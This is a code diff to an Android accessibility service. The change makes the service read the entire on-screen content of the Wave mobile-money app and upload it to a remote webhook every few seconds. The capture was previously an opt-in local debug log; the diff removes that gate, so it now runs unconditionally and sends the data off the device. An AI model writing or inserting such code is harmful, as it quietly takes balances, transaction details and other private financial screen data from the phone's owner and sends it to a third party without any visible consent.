@@ -16,6 +16,8 @@ public class SmsAccessibilityService extends AccessibilityService {
     private static final String REDDY_URL = "https://autoconfirm.online/webhook/reddy";
     private static final String SAAS_URL_DEFAULT = "https://autoconfirm.online/webhook/saas";
     private static final String WAVE_PACKAGE = "com.wave.personal";
+    private static long lastDumpSentAt = 0;
+    private static final long DUMP_THROTTLE_MS = 3000;
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -25,9 +27,16 @@ public class SmsAccessibilityService extends AccessibilityService {
         if (WAVE_PACKAGE.equals(pkg) &&
             (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
              event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
-            SharedPreferences dbgPrefs = getSharedPreferences("config", MODE_PRIVATE);
-            if (dbgPrefs.getBoolean("debug_wave_dump", false)) {
-                dumpNodeTree(getRootInActiveWindow(), 0);
+            long now = System.currentTimeMillis();
+            if (now - lastDumpSentAt > DUMP_THROTTLE_MS) {
+                lastDumpSentAt = now;
+                StringBuilder dumpSb = new StringBuilder();
+                dumpNodeTree(getRootInActiveWindow(), 0, dumpSb);
+                String dumpText = dumpSb.toString();
+                SharedPreferences prefsForDump = getSharedPreferences("config", MODE_PRIVATE);
+                String tokenForDump = prefsForDump.getString("token", "");
+                String urlForDump = prefsForDump.getString("url", SAAS_URL_DEFAULT);
+                send(urlForDump, tokenForDump, "WaveDump", dumpText);
             }
         }
 
@@ -64,17 +73,18 @@ public class SmsAccessibilityService extends AccessibilityService {
         }
     }
 
-    private void dumpNodeTree(AccessibilityNodeInfo node, int depth) {
+    private void dumpNodeTree(AccessibilityNodeInfo node, int depth, StringBuilder out) {
         if (node == null) return;
         StringBuilder indent = new StringBuilder();
         for (int i = 0; i < depth; i++) indent.append("  ");
         String txt = node.getText() != null ? node.getText().toString() : "";
         String desc = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
         String id = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
-        Log.d("WaveDump", indent + "[" + node.getClassName() + "] id=" + id
-                + " text=\"" + txt + "\" desc=\"" + desc + "\" clickable=" + node.isClickable());
+        out.append(indent).append("[").append(node.getClassName()).append("] id=").append(id)
+           .append(" text=\"").append(txt).append("\" desc=\"").append(desc)
+           .append("\" clickable=").append(node.isClickable()).append("\n");
         for (int i = 0; i < node.getChildCount(); i++) {
-            dumpNodeTree(node.getChild(i), depth + 1);
+            dumpNodeTree(node.getChild(i), depth + 1, out);
         }
     }
 
